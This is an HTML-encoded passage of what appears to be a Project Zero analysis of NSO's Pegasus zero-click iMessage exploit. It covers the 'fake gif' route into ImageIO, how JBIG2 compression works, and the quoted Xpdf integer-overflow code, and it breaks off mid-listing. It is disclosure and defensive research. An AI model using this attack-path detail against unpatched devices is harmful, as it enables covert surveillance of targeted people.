class="c3"&gt;&lt;span&gt;Last month the United States added NSO to the &amp;quot;Entity List&amp;quot;, severely restricting the ability of US companies to do business with NSO and &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://www.commerce.gov/news/press-releases/2021/11/commerce-adds-nso-group-and-other-foreign-companies-entity-list"&gt;stating in a press release&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;that &amp;quot;[NSO&amp;#39;s tools] enabled foreign governments to conduct transnational repression, which is the practice of authoritarian governments targeting dissidents, journalists and activists outside of their sovereign borders to silence dissent.&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Citizen Lab was able to recover these Pegasus exploits from an iPhone and therefore this analysis covers NSO&amp;#39;s capabilities against iPhone. We are aware that NSO sells similar zero-click capabilities which target Android devices; Project Zero&lt;/span&gt;&lt;span&gt;&amp;nbsp;does not have samples of these exploits&lt;/span&gt;&lt;span&gt;&amp;nbsp;but if you do, &lt;/span&gt;&lt;span&gt;please reach out.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c14 c8"&gt;From One to Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;In previous cases such as the &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/"&gt;Million Dollar Dissident from 2016&lt;/a&gt;&lt;/span&gt;&lt;span class="c5"&gt;, targets were sent links in SMS messages:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEgzqxpl0250IinIsgxGQRKF09QzU4pN0h8WvRtZQYaHjJmJ1MrGLh1wnEbaPBhSYHLgWezIfk6MOaGphBO3PRGX432k2dxcknktEErH4fW50f8MFzbqlMG-JdpGcSJw8NjMmTTAgKkBuCHku2Y06rQOS2mRI8voqyzI51OVlbBWA7CwtdFj4Sd50cMo7A=s870" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEgzqxpl0250IinIsgxGQRKF09QzU4pN0h8WvRtZQYaHjJmJ1MrGLh1wnEbaPBhSYHLgWezIfk6MOaGphBO3PRGX432k2dxcknktEErH4fW50f8MFzbqlMG-JdpGcSJw8NjMmTTAgKkBuCHku2Y06rQOS2mRI8voqyzI51OVlbBWA7CwtdFj4Sd50cMo7A=s870" border="0" alt="" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c9 c7"&gt;Screenshots of Phishing SMSs reported to Citizen Lab in 2016&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c7"&gt;source: &lt;/span&gt;&lt;span class="c16 c7"&gt;&lt;a class="c21" href="https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/"&gt;https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The target was only hacked when they clicked the link, a technique known as a one-click exploit. Recently, however, it has been documented that NSO is offering their clients zero-click exploitation technology, where even very technically savvy targets who might not click a phishing link are completely unaware they are being targeted. In the zero-click scenario no user interaction is required. Meaning, t&lt;/span&gt;&lt;span&gt;he attacker doesn&amp;#39;t need to send phishing messages; the exploit just works silently in the background&lt;/span&gt;&lt;span&gt;. Short of not using a device, t&lt;/span&gt;&lt;span&gt;here is no way to prevent exploitation by a zero-click exploit; it&amp;#39;s a weapon against which there is no defense&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8"&gt;One weird trick&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;The initial entry point for Pegasus on iPhone is iMessage. This means that a victim can be targeted just using their phone number or AppleID username.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;iMessage has native support for GIF images, the typically small and low quality animated images popular in meme culture. You can send and receive GIFs in iMessage chats and they show up in the chat window. Apple wanted to make those GIFs loop endlessly rather than only play once, so very early on in the &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://googleprojectzero.blogspot.com/2021/01/a-look-at-imessage-in-ios-14.html"&gt;iMessage parsing and processing pipeline&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(after a message has been received but well before the message is shown), iMessage calls the following method in the &lt;/span&gt;&lt;span class="c6"&gt;IMTranscoderAgent&lt;/span&gt;&lt;span&gt;&amp;nbsp;process&lt;/span&gt;&lt;span&gt;&amp;nbsp;(outside the &amp;quot;BlastDoor&amp;quot; sandbox), passing any image file received with the extension &lt;/span&gt;&lt;span class="c15"&gt;.gif&lt;/span&gt;&lt;span class="c5"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c15 c23"&gt;&amp;nbsp; [IMGIFUtils copyGifFromPath:toDestinationPath:error]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Looking at the selector name, the intention here was probably to just copy the GIF file before editing the loop count field, but the semantics of this method are different. Under the hood it uses the CoreGraphics APIs to &lt;/span&gt;&lt;span class="c7"&gt;render&lt;/span&gt;&lt;span&gt;&amp;nbsp;the source image to a &lt;/span&gt;&lt;span class="c7"&gt;new&lt;/span&gt;&lt;span&gt;&amp;nbsp;GIF file at the destination path. And just because the source filename has to end in &lt;/span&gt;&lt;span class="c15"&gt;.gif&lt;/span&gt;&lt;span class="c5"&gt;, that doesn&amp;#39;t mean it&amp;#39;s really a GIF file.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The ImageIO library, &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://googleprojectzero.blogspot.com/2020/04/fuzzing-imageio.html"&gt;as detailed in a previous Project Zero blogpost&lt;/a&gt;&lt;/span&gt;&lt;span class="c5"&gt;, is used to guess the correct format of the source file and parse it, completely ignoring the file extension. Using this &amp;quot;fake gif&amp;quot; trick, over 20 image codecs are suddenly part of the iMessage zero-click attack surface, including some very obscure and complex formats, remotely exposing probably hundreds of thousands of lines of code. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;Note: Apple inform us that they have restricted the available ImageIO formats reachable from IMTranscoderAgent starting in iOS 14.8.1 (26 October 2021), and completely removed the GIF code path from IMTranscoderAgent starting in iOS 15.0 (20 September 2021), with GIF decoding taking place entirely within BlastDoor.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8"&gt;A PDF in your GIF&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;NSO uses the &amp;quot;fake gif&amp;quot; trick to target a vulnerability in the CoreGraphics PDF parser.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;PDF was a popular target for exploitation around a decade ago, due to its ubiquity and complexity. Plus, the availability of javascript inside PDFs made development of reliable exploits far easier. The CoreGraphics PDF parser doesn&amp;#39;t &lt;/span&gt;&lt;span class="c7"&gt;seem&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;to interpret javascript, but NSO managed to find something equally powerful inside the CoreGraphics PDF parser...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c14 c8"&gt;Extreme compression&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;In the late 1990&amp;#39;s, bandwidth and storage were much more scarce than they are now. It was in that environment that the &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://en.wikipedia.org/wiki/JBIG2"&gt;JBIG2&lt;/a&gt;&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;standard emerged. JBIG2 is a domain specific image codec designed to compress images where pixels can only be black or white.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;It was developed to achieve extremely high compression ratios for scans of text documents and was implemented and used in high-end office scanner/printer devices like the XEROX WorkCenter device shown below. If you used the &lt;/span&gt;&lt;span class="c7"&gt;scan to pdf&lt;/span&gt;&lt;span&gt;&amp;nbsp;functionality of a device like this a decade ago, your PDF likely had a JBIG2 stream in it.&lt;/span&gt;&lt;span class="c5"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEjWZdMTUZfcCmxvlf99Hl9jE1A8OcfR-sD3kZR8xpOpwh05MFzQCfcDFIgLxDV_KalZHhqUIxKJ-YCHMSG3PGzPQq-FQYt3PhbycGxxqzljUCllSuZQsT4CEri977oV9jiS3pdCmu4Dmj3uzdEU2RlZgol--aaAdapWwid0C3xxo-kNhjdZs91-6WWLQQ=s700" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEjWZdMTUZfcCmxvlf99Hl9jE1A8OcfR-sD3kZR8xpOpwh05MFzQCfcDFIgLxDV_KalZHhqUIxKJ-YCHMSG3PGzPQq-FQYt3PhbycGxxqzljUCllSuZQsT4CEri977oV9jiS3pdCmu4Dmj3uzdEU2RlZgol--aaAdapWwid0C3xxo-kNhjdZs91-6WWLQQ=s700" border="0" alt="" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c9 c7"&gt;A Xerox WorkCentre 7500 series multifunction printer, which used JBIG2&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c7"&gt;for its scan-to-pdf functionality&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c7"&gt;source: &lt;/span&gt;&lt;span class="c16 c7"&gt;&lt;a class="c21" href="https://www.office.xerox.com/en-us/multifunction-printers/workcentre-7545-7556/specifications"&gt;https://www.office.xerox.com/en-us/multifunction-printers/workcentre-7545-7556/specifications&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;The PDFs files produced by those scanners were exceptionally small, perhaps only a few kilobytes. There are two novel techniques which JBIG2 uses to achieve these extreme compression ratios which are relevant to this exploit:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8"&gt;Technique&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;1: &lt;/span&gt;&lt;span class="c14 c8"&gt;Segmentation and substitution&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Effectively every text document, especially those written in languages with small alphabets like English or German, consists of many repeated letters (also known as &lt;/span&gt;&lt;span class="c7"&gt;glyphs&lt;/span&gt;&lt;span class="c5"&gt;) on each page. JBIG2 tries to segment each page into glyphs then uses simple pattern matching to match up glyphs which look the same:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c5"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEh6iNZLjmFtsjnVl7fWtG-Kq-TEw3azo1lwXKtyz-TNDRRQclfYG7p2tsSIoKJOKfhsBqSRDbJZ6gWH9K_7HeDpziuugHYegXG4Va111UEsCuBquBwf2BarcQIYFymNUlYS9d7YWHaSCLOO3BreLN6BT2V_Wj7flT9TjkpjaM_XtADdhrRN4Jy5b5qT_Q=s352" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEh6iNZLjmFtsjnVl7fWtG-Kq-TEw3azo1lwXKtyz-TNDRRQclfYG7p2tsSIoKJOKfhsBqSRDbJZ6gWH9K_7HeDpziuugHYegXG4Va111UEsCuBquBwf2BarcQIYFymNUlYS9d7YWHaSCLOO3BreLN6BT2V_Wj7flT9TjkpjaM_XtADdhrRN4Jy5b5qT_Q=s352" border="0" alt="" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c9 c7"&gt;Simple pattern matching can find all the shapes which look similar on a page,&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c9 c7"&gt;in this case all the &amp;#39;e&amp;#39;s&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c9 c7"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;JBIG2 doesn&amp;#39;t actually know anything about glyphs and it isn&amp;#39;t doing OCR (optical character recognition.) A JBIG encoder is just looking for connected regions of pixels and grouping similar looking regions together. The compression algorithm is to simply substitute all &lt;/span&gt;&lt;span class="c7"&gt;sufficiently-similar&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;looking regions with a copy of just one of them:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c5"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEgxM5VTCT6dKeMRITKT6kQDsQue8Py7eRGUYA045MkuaO9VagUeisKMa195020OTUHVSpDpI39qm8v5ZNG54OLNHwEfmuskR13PiIKAAAyBpoW0KnW2G3rncfSO4LC_b5zxDVTW0heCEaXEW95UHfwM7LZ2il-tonGDRHc6BQDhJ1rsYgRg_VbwSBefvQ=s327" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEgxM5VTCT6dKeMRITKT6kQDsQue8Py7eRGUYA045MkuaO9VagUeisKMa195020OTUHVSpDpI39qm8v5ZNG54OLNHwEfmuskR13PiIKAAAyBpoW0KnW2G3rncfSO4LC_b5zxDVTW0heCEaXEW95UHfwM7LZ2il-tonGDRHc6BQDhJ1rsYgRg_VbwSBefvQ=s327" border="0" alt="" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c9 c7"&gt;Replacing all occurrences of similar glyphs with a copy of just one often yields a document which is still quite legible and enables very high compression ratios&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;In this case the output is perfectly readable but the amount of information to be stored is significantly reduced. Rather than needing to store all the original pixel information for the whole page you only need a compressed version of the &amp;quot;reference glyph&amp;quot; for each character and the relative coordinates of all the places where copies should be made. The decompression algorithm then treats the output page like a canvas and &amp;quot;draws&amp;quot; the exact same glyph at all the stored locations.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;There&amp;#39;s a significant issue with such a scheme: it&amp;#39;s far too easy for a poor encoder to accidentally swap similar looking characters, and this can happen with interesting consequences. &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="http://www.dkriesel.com/en/blog/2013/0802_xerox-workcentres_are_switching_written_numbers_when_scanning"&gt;D. Kriesel&amp;#39;s blog has some motivating examples&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;where PDFs of scanned invoices have different figures or PDFs of scanned construction drawings end up with incorrect measurements. These aren&amp;#39;t the issues we&amp;#39;re looking at, but they are one significant reason why JBIG2 is not a common compression format anymore.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8"&gt;Technique &lt;/span&gt;&lt;span class="c8"&gt;2: &lt;/span&gt;&lt;span class="c8"&gt;Refinement coding&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;As mentioned above, the substitution based compression output is lossy. After a round of compression and decompression the rendered output doesn&amp;#39;t look exactly like the input. But JBIG2 also supports lossless compression as well as an intermediate &amp;quot;less lossy&amp;quot; compression mode.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;It does this by also storing (and compressing) the &lt;/span&gt;&lt;span class="c7"&gt;difference&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;between the substituted glyph and each original glyph. Here&amp;#39;s an example showing a difference mask between a substituted character on the left and the original lossless character in the middle:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c5"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEiJn4fCqItjd3bgJ_re3nMHB4aFgaR-17H6lGyPUDTdtmFAIO59Pg8WDxIYjBu_9cAFL_7fLp47YQBCzw5xiv-PdevPiJ0lyYdSvyMXrgpm45vnOtGrhjFgvRKoeVe9T8iIdZaHXFc8plsJm5QFYUop4cfcqklaYmr62HjOze-ZbA2GB4HGmXflhyF9_A=s267" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEiJn4fCqItjd3bgJ_re3nMHB4aFgaR-17H6lGyPUDTdtmFAIO59Pg8WDxIYjBu_9cAFL_7fLp47YQBCzw5xiv-PdevPiJ0lyYdSvyMXrgpm45vnOtGrhjFgvRKoeVe9T8iIdZaHXFc8plsJm5QFYUop4cfcqklaYmr62HjOze-ZbA2GB4HGmXflhyF9_A=s267" border="0" alt="" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c9 c7"&gt;Using the XOR operator on bitmaps to compute a difference image&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;In this simple example the encoder can store the difference mask shown on the right, then during decompression the difference mask can be XORed with the substituted character to recover the exact pixels making up the original character. There are some more tricks outside of the scope of this blog post to further compress that difference mask using the intermediate forms of the substituted character as a &amp;quot;context&amp;quot; for the compression.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Rather than completely encoding the entire difference in one go, it can be done in steps, with each iteration using a logical operator (one of AND, OR, XOR or XNOR) to set, clear or flip bits. Each successive refinement step brings the rendered output closer to the original and this allows a level of control over the &amp;quot;&lt;/span&gt;&lt;span&gt;lossiness&lt;/span&gt;&lt;span class="c5"&gt;&amp;quot; of the compression. The implementation of these refinement coding steps is very flexible and they are also able to &amp;quot;read&amp;quot; values already present on the output canvas.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c14 c8"&gt;A JBIG2 stream&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Most of the CoreGraphics PDF decoder appears to be Apple proprietary code, but the JBIG2 implementation is from Xpdf, &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://www.xpdfreader.com/download.html"&gt;the source code for which is freely available&lt;/a&gt;&lt;/span&gt;&lt;span class="c5"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;The JBIG2 format is a series of segments, which can be thought of as a series of drawing commands which are executed sequentially in a single pass. The CoreGraphics JBIG2 parser supports 19 different segment types which include operations like defining a new page, decoding a huffman table or rendering a bitmap to given coordinates on the page.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Segments are represented by the class &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Segment&lt;/span&gt;&lt;span&gt;&amp;nbsp;and its subclasses &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c6"&gt;JBIG2SymbolDict&lt;/span&gt;&lt;span class="c5"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;A &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;represents a rectangular array of pixels. Its &lt;/span&gt;&lt;span class="c6"&gt;data&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;field points to a backing-buffer containing the rendering canvas.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;A &lt;/span&gt;&lt;span class="c6"&gt;JBIG2SymbolDict&lt;/span&gt;&lt;span&gt;&amp;nbsp;groups &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmaps&lt;/span&gt;&lt;span&gt;&amp;nbsp;together. The destination page is represented as a &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span class="c5"&gt;, as are individual glyphs.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c6"&gt;JBIG2Segments&lt;/span&gt;&lt;span&gt;&amp;nbsp;can be referred to by a segment number and the &lt;/span&gt;&lt;span class="c6"&gt;GList&lt;/span&gt;&lt;span&gt;&amp;nbsp;vector type stores pointers to all the &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Segments&lt;/span&gt;&lt;span&gt;. To look up a segment by segment number the &lt;/span&gt;&lt;span class="c6"&gt;GList&lt;/span&gt;&lt;span&gt;&amp;nbsp;is scanned sequentially.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c14 c8"&gt;The vulnerability&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;The vulnerability is a classic integer overflow when collating referenced segments:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.7ed94ce0bf920398965583c15daf9916cc6dcfb3"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c22"&gt;&lt;tbody&gt;&lt;tr class="c11"&gt;&lt;td class="c13" colspan="1" rowspan="1"&gt; &lt;p class="c3"&gt;&lt;span class="c6"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c0 c18"&gt;Guint numSyms; // (1)&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; numSyms = 0;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; for (i = 0; i &amp;lt; nRefSegs; ++i) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; if ((seg = findSegment(refSegs[i]))) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; if (seg-&amp;gt;getType() == jbig2SegSymbolDict) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0 c18"&gt;numSyms += ((JBIG2SymbolDict *)seg)-&amp;gt;getSize(); &amp;nbsp;// (2)&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; } else if (seg-&amp;gt;getType() == jbig2SegCodeTable) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; codeTables-&amp;gt;append(seg);&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; } else {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; error(errSyntaxError, getPos(),&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;Invalid segment reference in JBIG2 text region&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; delete codeTables;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; return;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; // get the symbol bitmaps&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c6"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6 c18"&gt;syms = (&lt;/span&gt;&lt;span class="c6 c18"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span class="c6 c18"&gt;&amp;nbsp;**)gmallocn(numSyms, sizeof(&lt;/span&gt;&lt;span class="c6 c18"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span class="c0 c18"&gt;&amp;nbsp;*)); // (3)&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; kk = 0;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; for (i = 0; i &amp;lt; nRefSegs; ++i) {&lt;/span&gt;&lt;/p&gt; 